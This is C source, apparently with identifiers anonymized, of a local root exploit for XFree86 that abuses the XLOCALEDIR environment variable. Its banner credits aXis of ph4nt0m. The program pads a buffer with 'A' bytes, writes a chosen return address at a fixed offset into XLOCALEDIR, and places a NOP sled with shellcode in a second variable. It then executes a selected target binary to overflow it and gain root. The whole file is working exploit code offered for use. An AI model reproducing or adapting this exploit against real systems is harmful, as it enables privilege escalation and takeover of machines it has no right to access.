
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* dest; int num; char* version; int bufsize; unsigned long ret; int name; } ;


 int FUNC_0 (int ) ;
 int FUNC_1 (char*,int ,int ) ;
 int FUNC_2 (int) ;
 TYPE_1__* VAR_0 ;
 int FUNC_3 (int ,char*,...) ;
 int FUNC_4 (int,char**,char*) ;
 int FUNC_5 (char*,unsigned long*,int) ;
 int FUNC_6 (char*,int,int) ;
 int VAR_1 ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (char*,char*,int) ;
 unsigned long* VAR_2 ;
 int VAR_3 ;
 int FUNC_9 (unsigned long*) ;
 int FUNC_10 (char*) ;

int FUNC_11(int VAR_4, char **VAR_5){
  char VAR_6[4076];
  int VAR_7;
  int VAR_8;
  int VAR_9;
  int VAR_10;
  unsigned long VAR_11;


  while((VAR_9=FUNC_4(VAR_4,VAR_5,"ht:"))!=-1){
    switch(VAR_9){
       case 'h':
  FUNC_10(VAR_5[0]);
         FUNC_2(0);
       case 't':
         VAR_8=FUNC_0(VAR_1);

         if(VAR_8>6||VAR_8<0){
           FUNC_7("Wrong Target!\n\n");
           FUNC_2(0);

         }

         if(VAR_8==0){
    FUNC_10(VAR_5[0]);
           FUNC_7("Please select target num !\n");
           FUNC_7("======================================\n");
           for(VAR_7=0;VAR_0[VAR_7].dest;VAR_7++)
           FUNC_3(VAR_3,"[%d]  | %s  %s  \n",VAR_0[VAR_7].num,VAR_0[VAR_7].version,VAR_0[VAR_7].dest);
      FUNC_2(1);


         }
  break;
    default:
      FUNC_10(VAR_5[0]);
      FUNC_2(0);

     }

  }

  VAR_10=VAR_0[VAR_8-1].bufsize;
  VAR_11=VAR_0[VAR_8-1].ret;


  FUNC_6(VAR_6,0x41,4072);
  FUNC_5(VAR_6+2076,&VAR_11,0x4);
  FUNC_8("XLOCALEDIR",VAR_6,1);


  FUNC_6(VAR_6,0x90,VAR_10);
  FUNC_5(VAR_6+4000+VAR_7,VAR_2,FUNC_9(VAR_2));
  FUNC_8("PH4NT0M",VAR_6,1);


  FUNC_7("\n++++++++++++++++++++++++++++++\n");
  FUNC_7("Xfree86 XLOCALEDIR env local root exploit\n");
  FUNC_7("++++++++++++++++++++++++++++++++\n\n");
  FUNC_7("coded by aXis,aXis@ph4nt0m.net\n");
  FUNC_7("PST,www.ph4nt0m.org\n\n");
  FUNC_7("retaddr is at 0x%lx  \n",VAR_11);
  FUNC_7("buf is at 0x%lx \n",&VAR_6);

  if(FUNC_1((VAR_0[VAR_8-1].dest),(VAR_0[VAR_8-1].name),0)==-1){
    FUNC_3(VAR_3,"failed,try another target! -h for help\n\n");
      FUNC_2(-1);
  }

  return 0;
}
